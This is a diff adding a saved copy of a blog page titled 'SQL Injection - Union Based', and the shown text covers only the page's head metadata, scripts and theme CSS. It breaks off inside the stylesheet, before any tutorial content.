@@ -1,0 +1,836 @@
+<!DOCTYPE html>
+<!-- saved from url=(0073)http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/ -->
+<html lang="en-US" prefix="og: http://ogp.me/ns#" class="gr__danieledonzelli_com"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="x-ua-compatible" content="IE=Edge"> 
+
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>
+SQL Injection - Union Based - Daniele Donzelli</title>
+<link rel="shortcut icon" href="http://www.danieledonzelli.com/wp-content/uploads/2016/04/Favicon.ico">
+<script>
+mixajaxurl = "http://www.danieledonzelli.com/wp-admin/admin-ajax.php";
+</script>
+<!-- html5.js for IE less than 9 -->
+<!--[if lt IE 9]>
+<script src="http://www.danieledonzelli.com/wp-content/themes/TheFox/js/html5.js"></script>
+<![endif]-->
+<!-- css3-mediaqueries.js for IE less than 9 -->
+<!--[if lt IE 9]>
+<script src="http://www.danieledonzelli.com/wp-content/themes/TheFox/js/css3-mediaqueries.js"></script>
+<![endif]-->
+
+<!-- This site is optimized with the Yoast SEO plugin v9.6 - https://yoast.com/wordpress/plugins/seo/ -->
+<meta name="description" content="In this tutorial i&#39;ll show you how sql injection works and how to use it to extract information from the database....">
+<link rel="canonical" href="http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/">
+<meta property="og:locale" content="en_US">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL Injection - Union Based - Daniele Donzelli">
+<meta property="og:description" content="In this tutorial i&#39;ll show you how sql injection works and how to use it to extract information from the database....">
+<meta property="og:url" content="http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/">
+<meta property="og:site_name" content="Daniele Donzelli">
+<meta property="article:publisher" content="https://www.facebook.com/daniele.donzelli.52">
+<meta property="article:author" content="https://www.facebook.com/daniele.donzelli.52">
+<meta property="article:section" content="Ethical Hacking">
+<meta property="article:published_time" content="2016-07-04T18:34:15+00:00">
+<meta property="article:modified_time" content="2016-07-04T18:45:54+00:00">
+<meta property="og:updated_time" content="2016-07-04T18:45:54+00:00">
+<meta property="og:image" content="http://www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunionfeatured-1024x755.jpg">
+<meta property="og:image:width" content="1024">
+<meta property="og:image:height" content="755">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:description" content="In this tutorial i&#39;ll show you how sql injection works and how to use it to extract information from the database....">
+<meta name="twitter:title" content="SQL Injection - Union Based - Daniele Donzelli">
+<meta name="twitter:site" content="@ArrowStark">
+<meta name="twitter:image" content="http://www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunionfeatured.jpg">
+<meta name="twitter:creator" content="@ArrowStark">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"Organization","url":"http://www.danieledonzelli.com/","sameAs":["https://www.facebook.com/daniele.donzelli.52","https://www.linkedin.com/in/daniele-donzelli-04ba7364","https://www.youtube.com/channel/UCYXPmInXhAQ4wqcGGLRvlYQ","https://twitter.com/ArrowStark"],"@id":"http://www.danieledonzelli.com/#organization","name":"Daniele Donzelli","logo":"http://www.danieledonzelli.com/wp-content/uploads/2016/04/Logo.png"}</script>
+<!-- / Yoast SEO plugin. -->
+
+<link rel="dns-prefetch" href="http://s0.wp.com/">
+<link rel="dns-prefetch" href="http://secure.gravatar.com/">
+<link rel="dns-prefetch" href="http://fonts.googleapis.com/">
+<link rel="dns-prefetch" href="http://s.w.org/">
+<link rel="alternate" type="application/rss+xml" title="Daniele Donzelli » Feed" href="http://www.danieledonzelli.com/feed/">
+<link rel="alternate" type="application/rss+xml" title="Daniele Donzelli » Comments Feed" href="http://www.danieledonzelli.com/comments/feed/">
+<link rel="alternate" type="application/rss+xml" title="Daniele Donzelli » SQL Injection – Union Based Comments Feed" href="http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/feed/">
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/11.2.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/11.2.0\/svg\/","svgExt":".svg","source":{"concatemoji":"http:\/\/www.danieledonzelli.com\/wp-includes\/js\/wp-emoji-release.min.js"}};
+			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55358,56760,9792,65039],[55358,56760,8203,9792,65039]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script><script src="./SQL Injection - Union Based - Daniele Donzelli_files/wp-emoji-release.min.js.download" type="text/javascript" defer=""></script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel="stylesheet" id="crayon-css" href="./SQL Injection - Union Based - Daniele Donzelli_files/crayon.min.css" type="text/css" media="all">
+<link rel="stylesheet" id="wp-block-library-css" href="./SQL Injection - Union Based - Daniele Donzelli_files/style.min.css" type="text/css" media="all">
+<link rel="stylesheet" id="layerslider-css" href="./SQL Injection - Union Based - Daniele Donzelli_files/layerslider.css" type="text/css" media="all">
+<link rel="stylesheet" id="ls-google-fonts-css" href="./SQL Injection - Union Based - Daniele Donzelli_files/css" type="text/css" media="all">
+<link rel="stylesheet" id="contact-form-7-css" href="./SQL Injection - Union Based - Daniele Donzelli_files/styles.css" type="text/css" media="all">
+<link rel="stylesheet" id="rs-plugin-settings-css" href="./SQL Injection - Union Based - Daniele Donzelli_files/settings.css" type="text/css" media="all">
+<style id="rs-plugin-settings-inline-css" type="text/css">
+#rs-demo-id {}
+</style>
+<link rel="stylesheet" id="style-css" href="./SQL Injection - Union Based - Daniele Donzelli_files/style.css" type="text/css" media="all">
+<link rel="stylesheet" id="style_end-css" href="./SQL Injection - Union Based - Daniele Donzelli_files/style_end.css" type="text/css" media="all">
+<link rel="stylesheet" id="googlefonts-css" href="./SQL Injection - Union Based - Daniele Donzelli_files/css(1)" type="text/css" media="all">
+<link rel="stylesheet" id="media-queries-css" href="./SQL Injection - Union Based - Daniele Donzelli_files/media-queries_wide.css" type="text/css" media="all">
+<link rel="stylesheet" id="rgs-css" href="./SQL Injection - Union Based - Daniele Donzelli_files/rgs.css" type="text/css" media="all">
+<link rel="stylesheet" id="css3_animations-css" href="./SQL Injection - Union Based - Daniele Donzelli_files/animations.css" type="text/css" media="all">
+<link rel="stylesheet" id="flexslidercss-css" href="./SQL Injection - Union Based - Daniele Donzelli_files/flexslider.css" type="text/css" media="all">
+<link rel="stylesheet" id="font-awesome-thefox-css" href="./SQL Injection - Union Based - Daniele Donzelli_files/font-awesome.css" type="text/css" media="all">
+<link rel="stylesheet" id="moon-css" href="./SQL Injection - Union Based - Daniele Donzelli_files/moon.css" type="text/css" media="all">
+<link rel="stylesheet" id="elegant-css" href="./SQL Injection - Union Based - Daniele Donzelli_files/elegant.css" type="text/css" media="all">
+<link rel="stylesheet" id="prettyphotocss-css" href="./SQL Injection - Union Based - Daniele Donzelli_files/prettyPhoto.css" type="text/css" media="all">
+<link rel="stylesheet" id="js_frontend-css" href="./SQL Injection - Union Based - Daniele Donzelli_files/thefox_js_composer.css" type="text/css" media="all">
+<link rel="stylesheet" id="zilla-likes-css" href="./SQL Injection - Union Based - Daniele Donzelli_files/zilla-likes.css" type="text/css" media="all">
+<link rel="stylesheet" id="simple-social-icons-font-css" href="./SQL Injection - Union Based - Daniele Donzelli_files/style(1).css" type="text/css" media="all">
+<link rel="stylesheet" id="bsf-Defaults-css" href="./SQL Injection - Union Based - Daniele Donzelli_files/Defaults.css" type="text/css" media="all">
+<link rel="stylesheet" id="redux-google-fonts-rd_data-css" href="./SQL Injection - Union Based - Daniele Donzelli_files/css(2)" type="text/css" media="all">
+<link rel="stylesheet" id="jetpack_css-css" href="./SQL Injection - Union Based - Daniele Donzelli_files/jetpack.css" type="text/css" media="all">
+<script type="text/javascript" src="./SQL Injection - Union Based - Daniele Donzelli_files/jquery.js.download"></script>
+<script type="text/javascript" src="./SQL Injection - Union Based - Daniele Donzelli_files/jquery-migrate.min.js.download"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"http:\/\/www.danieledonzelli.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
+var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="./SQL Injection - Union Based - Daniele Donzelli_files/crayon.min.js.download"></script>
+<script type="text/javascript" src="./SQL Injection - Union Based - Daniele Donzelli_files/greensock.js.download"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+var LS_Meta = {"v":"5.6.9"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="./SQL Injection - Union Based - Daniele Donzelli_files/layerslider.kreaturamedia.jquery.js.download"></script>
+<script type="text/javascript" src="./SQL Injection - Union Based - Daniele Donzelli_files/layerslider.transitions.js.download"></script>
+<script type="text/javascript" src="./SQL Injection - Union Based - Daniele Donzelli_files/jquery.themepunch.tools.min.js.download"></script>
+<script type="text/javascript" src="./SQL Injection - Union Based - Daniele Donzelli_files/jquery.themepunch.revolution.min.js.download"></script>
+<script type="text/javascript" src="./SQL Injection - Union Based - Daniele Donzelli_files/svgxuse.js.download"></script>
+<meta name="generator" content="Powered by LayerSlider 5.6.9 - Multi-Purpose, Responsive, Parallax, Mobile-Friendly Slider Plugin for WordPress.">
+<!-- LayerSlider updates and docs at: https://kreaturamedia.com/layerslider-responsive-wordpress-slider-plugin/ -->
+<link rel="https://api.w.org/" href="http://www.danieledonzelli.com/wp-json/">
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.danieledonzelli.com/xmlrpc.php?rsd">
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.danieledonzelli.com/wp-includes/wlwmanifest.xml"> 
+
+<link rel="shortlink" href="https://wp.me/p7rj47-4e">
+<link rel="alternate" type="application/json+oembed" href="http://www.danieledonzelli.com/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwww.danieledonzelli.com%2Fethical-hacking%2Fsql-injection-union-based%2F">
+<link rel="alternate" type="text/xml+oembed" href="http://www.danieledonzelli.com/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwww.danieledonzelli.com%2Fethical-hacking%2Fsql-injection-union-based%2F&amp;format=xml">
+<script type="text/javascript">
+(function(url){
+	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
+	var addEvent = function(evt, handler) {
+		if (window.addEventListener) {
+			document.addEventListener(evt, handler, false);
+		} else if (window.attachEvent) {
+			document.attachEvent('on' + evt, handler);
+		}
+	};
+	var removeEvent = function(evt, handler) {
+		if (window.removeEventListener) {
+			document.removeEventListener(evt, handler, false);
+		} else if (window.detachEvent) {
+			document.detachEvent('on' + evt, handler);
+		}
+	};
+	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
+	var logHuman = function() {
+		if (window.wfLogHumanRan) { return; }
+		window.wfLogHumanRan = true;
+		var wfscr = document.createElement('script');
+		wfscr.type = 'text/javascript';
+		wfscr.async = true;
+		wfscr.src = url + '&r=' + Math.random();
+		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
+		for (var i = 0; i < evts.length; i++) {
+			removeEvent(evts[i], logHuman);
+		}
+	};
+	for (var i = 0; i < evts.length; i++) {
+		addEvent(evts[i], logHuman);
+	}
+})('//www.danieledonzelli.com/?wordfence_lh=1&hid=3723F19BC3284EA7C2A9D538ADE1872A');
+</script>
+<link rel="dns-prefetch" href="http://v0.wordpress.com/">
+<link rel="dns-prefetch" href="http://i0.wp.com/">
+<link rel="dns-prefetch" href="http://i1.wp.com/">
+<link rel="dns-prefetch" href="http://i2.wp.com/">
+<style type="text/css">img#wpstats{display:none}</style><!-- Custom Styling -->
+<style type="text/css">
+#logo_img img{max-width:350px;}.cl_before_logo{margin-right:205px;}.cl_after_logo{margin-left:205px;}.nav_type_9_c #logo_img, .nav_type_9_c .logo_text{margin-left:-175px;}.nav_type_9_c #logo_img,.nav_type_9_c .logo_text{min-width:350px;}#mobile-menu{background:#222533}#mobile-menu ul ul,#mobile-menu #rd_wpml #lang_sel ul ul{background:#2e3244;}#mobile-menu ul ul ul{background:#35384d;}#mobile-menu .mobile-ul-open > a{color:#0f97f9}#mobile-menu .mobile-ul-open:after{color:#0f97f9 !important;}#mobile-menu .current_page_item{ background:#191b26;}#mobile-menu .current_page_item > a { border-left:2px solid #0f97f9;}#mobile-menu ul li a,#mobile-menu #rd_wpml #lang_sel a{color:#ffffff}#mobile-menu .menu-item-has-children:after{color:#5a5d6b;}#mobile-menu ul li li li a{color:#69708f}#mobile-menu ul ul .menu-item-has-children:after{color:#5d637d;}#mobile_menu_search #search input[type=text]{background:#191b26 !important; color:#69708f;}#mobile_menu_search #search input[type=submit]{color:#69708f;}#top_bar,#rd_wpml #lang_sel ul ul{background:#ffffff;}.topbar_type_1,.topbar_type_1 a,.topbar_type_1 #rd_wpml #lang_sel a{color:#a1b1bc;}.topbar_type_1 strong,.topbar_type_1 .topbar_woocommerce_login.type1 .topbar_sign_in,.topbar_type_1 .topbar_woocommerce_login.type1 .topbar_register,.topbar_type_1 .topbar_woocommerce_login.type1 .topbar_signed_in,.topbar_type_1 #rd_wpml #lang_sel li li a:hover{color:#2c3e50;}.topbar_type_1 .top_email:before,.topbar_type_1 .top_phone:before,.topbar_type_1 .top_text:before{color:#1abc9c;}.topbar_type_1 .top_email,.topbar_type_1 .top_phone,.topbar_type_1 #header_socials,.topbar_type_1 .header_current_cart{border-right:1px solid #ebebeb; padding-right:20px; padding-left:20px;}.topbar_type_1 .topbar_woocommerce_login{border-right:1px solid #ebebeb; border-left:1px solid #ebebeb; padding-right:20px; padding-left:20px;}.topbar_type_1 #rd_wpml,.topbar_type_1 .top_bar_menu{border-right:1px solid #ebebeb;}.topbar_type_1 .wrapper > div:first-child {border-left:1px solid #ebebeb;}.topbar_type_1 .topbar_woocommerce_login.type1 .topbar_register{ border:1px solid #ebebeb; border-bottom:2px solid #ebebeb}.topbar_type_1 .topbar_woocommerce_login.type2 .topbar_register{ border:1px solid #a1b1bc; background:#a1b1bc; color:#ffffff;}.topbar_type_1 .topbar_woocommerce_login.type2 .topbar_sign_in,.topbar_type_1 .topbar_woocommerce_login.type2 .topbar_signed_in{ border:1px solid #a1b1bc;}.topbar_type_1 #header_socials a:hover{ color:#2c3e50;}.topbar_type_2,.topbar_type_2 a,.topbar_type_2 #rd_wpml #lang_sel a{color:#a1b1bc;}.topbar_type_2 strong,.topbar_type_2 .topbar_woocommerce_login.type1 .topbar_sign_in,.topbar_type_2 .topbar_woocommerce_login.type1 .topbar_register,.topbar_type_2 .topbar_woocommerce_login.type1 .topbar_signed_in,.topbar_type_2 #rd_wpml #lang_sel li li a:hover{color:#2c3e50;}.topbar_type_2 .top_email:before,.topbar_type_2 .top_phone:before,.topbar_type_2 .top_text:before{color:#1abc9c;}.topbar_type_2 .top_email,.topbar_type_2 .top_phone,.topbar_type_2 #header_socials,.topbar_type_2 .header_current_cart{border-right:1px solid #ebebeb; padding-right:20px; padding-left:20px;}.topbar_type_2 .topbar_woocommerce_login{border-right:1px solid #ebebeb; border-left:1px solid #ebebeb; padding-right:20px; padding-left:20px;}.topbar_type_2 { border-top:5px solid #1abc9c;}.topbar_type_2 #rd_wpml,.topbar_type_2 .top_bar_menu{border-right:1px solid #ebebeb;}.topbar_type_2 .wrapper > div:first-child {border-left:1px solid #ebebeb;}.topbar_type_2 .topbar_woocommerce_login.type1 .topbar_register{ border:1px solid #ebebeb; border-bottom:2px solid #ebebeb}.topbar_type_2 .topbar_woocommerce_login.type2 .topbar_register{ border:1px solid #a1b1bc; background:#a1b1bc; color:#ffffff;}.topbar_type_2 .topbar_woocommerce_login.type2 .topbar_sign_in,.topbar_type_2 .topbar_woocommerce_login.type2 .topbar_signed_in{ border:1px solid #a1b1bc;}.topbar_type_2 #header_socials a:hover{ color:#2c3e50;}.topbar_type_3,.topbar_type_3 a,.topbar_type_3 #rd_wpml #lang_sel a{color:#a1b1bc;}.topbar_type_3 strong,.topbar_type_3 .topbar_woocommerce_login.type1 .topbar_sign_in,.topbar_type_3 .topbar_woocommerce_login.type1 .topbar_register,.topbar_type_3 .topbar_woocommerce_login.type1 .topbar_signed_in,.topbar_type_3 #rd_wpml #lang_sel li li a:hover{color:#2c3e50;}.topbar_type_3 .top_email:before,.topbar_type_3 .top_phone:before,.topbar_type_3 .top_text:before{color:#1abc9c;}.topbar_type_2 { border-top:5px solid #1abc9c;}.topbar_type_3 .topbar_woocommerce_login.type1 .topbar_register{ border:1px solid #ebebeb; border-bottom:2px solid #ebebeb}.topbar_type_3 .topbar_woocommerce_login.type2 .topbar_register{ border:1px solid #a1b1bc; background:#a1b1bc; color:#ffffff;}.topbar_type_3 .topbar_woocommerce_login.type2 .topbar_sign_in,.topbar_type_3 .topbar_woocommerce_login.type2 .topbar_signed_in{ border:1px solid #a1b1bc;}.topbar_type_3 #header_socials a:hover{ color:#2c3e50;}.topbar_type_4,.topbar_type_4 a,.topbar_type_4 #rd_wpml #lang_sel a{color:#a1b1bc;}.topbar_type_4 strong,.topbar_type_4 .topbar_woocommerce_login.type1 .topbar_sign_in,.topbar_type_4 .topbar_woocommerce_login.type1 .topbar_register,.topbar_type_4 .topbar_woocommerce_login.type1 .topbar_signed_in,.topbar_type_4 #rd_wpml #lang_sel li li a:hover{color:#2c3e50;}.topbar_type_4 .top_email:before,.topbar_type_4 .top_phone:before,.topbar_type_4 .top_text:before{color:#1abc9c;}.topbar_type_4 { border-top:5px solid #1abc9c;}.topbar_type_4 .topbar_woocommerce_login.type1 .topbar_register{ border:1px solid #ebebeb; border-bottom:2px solid #ebebeb}.topbar_type_4 .topbar_woocommerce_login.type2 .topbar_register{ border:1px solid #a1b1bc; background:#a1b1bc; color:#ffffff;}.topbar_type_4 .topbar_woocommerce_login.type2 .topbar_sign_in,.topbar_type_4 .topbar_woocommerce_login.type2 .topbar_signed_in{ border:1px solid #a1b1bc;}.topbar_type_4 #header_socials a:hover{ color:#2c3e50;}.topbar_type_5,.topbar_type_5 a,.topbar_type_5 #rd_wpml #lang_sel a{color:#a1b1bc;}.topbar_type_5 strong,.topbar_type_5 .topbar_woocommerce_login.type1 .topbar_sign_in,.topbar_type_5 .topbar_woocommerce_login.type1 .topbar_register,.topbar_type_5 .topbar_woocommerce_login.type1 .topbar_signed_in,.topbar_type_5 #rd_wpml #lang_sel li li a:hover,.topbar_woocommerce_login.type2 .topbar_sign_in:hover,.top_email a:hover{color:#2c3e50;}.topbar_type_5 .top_email:before,.topbar_type_5 .top_phone:before,.topbar_type_5 .top_text:before{color:#1abc9c; }.topbar_type_5 .top_email,.topbar_type_5 .top_phone,.topbar_type_5 #header_socials,.topbar_type_5 .header_current_cart{border-right:1px solid #ebebeb; padding-right:20px; padding-left:20px;}.topbar_type_5 .topbar_woocommerce_login{border-right:1px solid #ebebeb; border-left:1px solid #ebebeb; padding-right:20px; padding-left:20px;}.topbar_type_5 .wrapper > div:first-child {border-left:1px solid #ebebeb;}.topbar_type_5 #rd_wpml,.topbar_type_5 .top_bar_menu{border-right:1px solid #ebebeb;}.topbar_type_5 { border-top:4px solid #1abc9c; border-bottom:1px solid #ebebeb}.topbar_type_5 .topbar_woocommerce_login.type1 .topbar_register{ border:1px solid #ebebeb; border-bottom:2px solid #ebebeb}.topbar_type_5 .topbar_woocommerce_login.type2 .topbar_register{ border:1px solid #a1b1bc; background:#a1b1bc; color:#ffffff;}.topbar_type_5 .topbar_woocommerce_login.type2 .topbar_sign_in,.topbar_type_5 .topbar_woocommerce_login.type2 .topbar_signed_in{ border:1px solid #a1b1bc;}.topbar_type_5 #header_socials a:hover{ color:#2c3e50;}.header_current_cart .cart-content-tb.tbi-with-border{border:1px solid #ebebeb;}.header_current_cart .cart-content-tb.tbi-with-bg{background:#ebebeb;}.header_current_cart .cart-content-tb:before{color:#1abc9c;}.header_current_cart .cart-content-tb:hover{color:#a1b1bc;}.nav_type_1 ul li a,.nav_type_2 ul li a,.nav_type_3 ul li a,.nav_type_4 ul li a,.nav_type_5 ul li a,.nav_type_6 ul li a,.nav_type_7 ul li a,.nav_type_8 ul li a,.nav_type_9 ul li a,.nav_type_9_c ul li a,.nav_type_10 ul li a,.nav_type_11 ul li a,.nav_type_12 ul li a,.nav_type_13 ul li a,.nav_type_14 ul li a,.nav_type_15 ul li a,.nav_type_16 ul li a,.nav_type_17 ul li a,.nav_type_18 ul li a,.nav_type_19 ul li a,.nav_type_19_f ul li a{font-family:Raleway !important; font-size:14px !important; font-weight:400 !important; }.transparent_header{background:rgba(255,255,255,0)!important;}.transparent_header{border-bottom:1px solid rgba(255,255,255,0.25)!important;}header,.mt_menu{background:#ffffff;}header.transparent_header.opaque_header{background:#ffffff !important; border-bottom:none!important;}#nav_button:before,#nav_button_alt:before{color:#51585e;}.logo_text a{color:#51585e;}.transparent_header .logo_text a{color:#fff;}.transparent_header.opaque_header .logo_text a{color:#51585e;}.transparent_header nav > ul > li > a, .transparent_header .cart-content, .transparent_header nav > li.current-menu-item li a, .transparent_header #searchtop_img .fa-search, .transparent_header .header_si a, .transparent_header #nav_button:before {
+	color:rgba(255,255,255,0.85)!important;
+	}.nav_type_1 nav ul,.nav_type_1 .header_current_cart{background:#ffffff;}.nav_type_1 ul li a,.nav_type_1 a#searchtop_img{color:#51585e;}.nav_type_1 nav ul li a:hover,.nav_type_1 > ul > .current-menu-item > a{color:#288bd0; background:#f9f9fb;}.nav_type_1 .cart-content:hover,.nav_type_1 #searchtop_img:hover i{color:#288bd0;}header.nav_type_2{border-top:1px solid #ecf0f1;}.nav_type_2 nav ul,.nav_type_2 .header_current_cart{background:#ffffff;}.nav_type_2 ul li a,.nav_type_2 a#searchtop_img{color:#51585e;}.nav_type_2 nav ul li a:hover,.nav_type_2 > ul > .current-menu-item > a,.transparent_header.nav_type_2 nav > ul > .current-menu-item > a,.transparent_header.nav_type_2 nav > ul > li > a:hover{color:#288bd0; border-top:3px solid #288bd0; }.nav_type_2 .cart-content:hover,.nav_type_2 #searchtop_img:hover i{color:#288bd0;}header.nav_type_3{border-top:1px solid #ecf0f1;}.nav_type_3 nav ul,.nav_type_3 .header_current_cart{background:#ffffff;}.nav_type_3 ul li a,.nav_type_3 a#searchtop_img{color:#51585e;}.nav_type_3 nav ul li a:hover,.nav_type_3 > ul > .current-menu-item > a{color:#288bd0; background:#f9f9fb;}.nav_type_3 .cart-content:hover,.nav_type_3 #searchtop_img:hover i{color:#288bd0;}header.nav_type_4{border-top:1px solid #ecf0f1;}.nav_type_4 nav ul,.nav_type_4 .header_current_cart{background:#ffffff;}.nav_type_4 ul li a,.nav_type_4 a#searchtop_img{color:#51585e;}.nav_type_4 nav ul li a:hover,.nav_type_4  > ul > .current-menu-item > a{color:#288bd0; background:#f9f9fb;}.nav_type_4 .cart-content:hover,.nav_type_4 #searchtop_img:hover i{color:#288bd0;}.nav_type_5 nav ul,.nav_type_5 .header_current_cart{background:#ffffff;}.nav_type_5 ul li a{color:#51585e; border-top:5px solid #ffffff;}.nav_type_5 a#searchtop_img{color:#51585e;}.nav_type_5 nav ul li a:hover,.nav_type_5 > ul > .current-menu-item > a,.transparent_header.nav_type_5 nav > ul > .current-menu-item > a,.transparent_header.nav_type_5 nav > ul > li > a:hover{color:#288bd0; border-top:5px solid #288bd0 !important; }.nav_type_5 .cart-content:hover,.nav_type_5 #searchtop_img:hover i{color:#288bd0;}.nav_type_6 nav ul,.nav_type_6 .header_current_cart{background:#ffffff;}.nav_type_6 ul li a{color:#51585e; border-top:5px solid #ffffff;}.nav_type_6 a#searchtop_img{color:#51585e;}.nav_type_6 nav ul li a:hover,.nav_type_6 > ul > .current-menu-item > a,.transparent_header.nav_type_6 nav > ul > .current-menu-item > a,.transparent_header.nav_type_6 nav > ul > li > a:hover{color:#288bd0; border-top:5px solid #288bd0 !important;}.nav_type_6 .cart-content:hover,.nav_type_6 #searchtop_img:hover i{color:#288bd0;}.nav_type_7 nav ul,.nav_type_7 .header_current_cart{background:#ffffff;}.nav_type_7 ul li a,.nav_type_7 a#searchtop_img{color:#51585e;}.nav_type_7 nav ul li a:hover,.nav_type_7 > ul > .current-menu-item > a{color:#288bd0; background:#f9f9fb;}.nav_type_7 .cart-content:hover,.nav_type_7 #searchtop_img:hover i{color:#288bd0;}header.nav_type_8{border-top:1px solid #ecf0f1;}.nav_type_8 nav ul,.nav_type_8 .header_current_cart{background:#ffffff;}.nav_type_8 ul li a,.nav_type_8 a#searchtop_img{color:#51585e;}.nav_type_8 nav ul li a:hover,.nav_type_8 > ul > .current-menu-item > a{color:#288bd0; background:#f9f9fb;}.nav_type_8 .cart-content:hover,.nav_type_8 #searchtop_img:hover i{color:#288bd0;}.nav_type_9 nav ul,.nav_type_9 .header_current_cart{background:#ffffff;}.nav_type_9 ul li a{color:#51585e; border-top:5px solid rgba(0,0,0,0);}.nav_type_9 a#searchtop_img{color:#51585e;}.nav_type_9 nav ul li a:hover,.nav_type_9 > ul > .current-menu-item > a,.transparent_header.nav_type_9 nav > ul > .current-menu-item > a,.transparent_header.nav_type_9 nav > ul > li > a:hover{color:#288bd0; border-top:5px solid #288bd0 !important;}.nav_type_9 .cart-content:hover,.nav_type_9 #searchtop_img:hover i{color:#288bd0;}.nav_type_9_c nav ul,.nav_type_9_c .header_current_cart{background:#ffffff;}.nav_type_9_c ul li a{color:#51585e; border-top:5px solid rgba(0,0,0,0);}.nav_type_9_c a#searchtop_img{color:#51585e;}.nav_type_9_c nav ul li a:hover,.nav_type_9_c > ul > .current-menu-item > a,.transparent_header.nav_type_9_c nav > ul > .current-menu-item > a,.transparent_header.nav_type_9_c nav > ul > li > a:hover{color:#288bd0; border-top:5px solid #288bd0 !important;}.nav_type_9_c .header_current_cart,.nav_type_9_c #searchtop{display:none !important;}.nav_type_10 nav ul,.nav_type_10 .header_current_cart{background:#ffffff;}.nav_type_10 ul li a{color:#51585e; border-top:5px solid rgba(0,0,0,0);}.nav_type_10 a#searchtop_img{color:#51585e;}.nav_type_10 nav ul li a:hover,.nav_type_10 > ul > .current-menu-item > a,.transparent_header.nav_type_15 nav > ul > .current-menu-item > a,.transparent_header.nav_type_15 nav > ul > li > a:hover{color:#288bd0; border-top:5px solid #288bd0 !important;}.nav_type_10 .cart-content:hover,.nav_type_10 #searchtop_img:hover i{color:#288bd0;}.nav_type_11 nav ul,.nav_type_11 .header_current_cart{background:#ffffff;}.nav_type_11 ul li a{color:#51585e; border:1px solid rgba(0,0,0,0);}.nav_type_11 a#searchtop_img{color:#51585e;}.nav_type_11 nav ul li a:hover,.nav_type_11 > ul > .current-menu-item > a,.transparent_header.nav_type_11 nav > ul > .current-menu-item > a,.transparent_header.nav_type_11 nav > ul > li > a:hover{color:#288bd0; border:1px solid #288bd0 !important; background:#f9f9fb;}.nav_type_11 .cart-content:hover,.nav_type_11 #searchtop_img:hover i{color:#288bd0;}.nav_type_12 nav ul,.nav_type_12 .header_current_cart{background:#ffffff;}.nav_type_12 ul li a{color:#51585e; border:2px solid rgba(0,0,0,0);}.nav_type_12 a#searchtop_img{color:#51585e;}.nav_type_12 nav ul li a:hover,.nav_type_12 > ul > .current-menu-item > a,.transparent_header.nav_type_12 nav > ul > .current-menu-item > a,.transparent_header.nav_type_12 nav > ul > li > a:hover{color:#288bd0; border:2px solid #288bd0 !important; background:#f9f9fb;}.nav_type_12 .cart-content:hover,.nav_type_12 #searchtop_img:hover 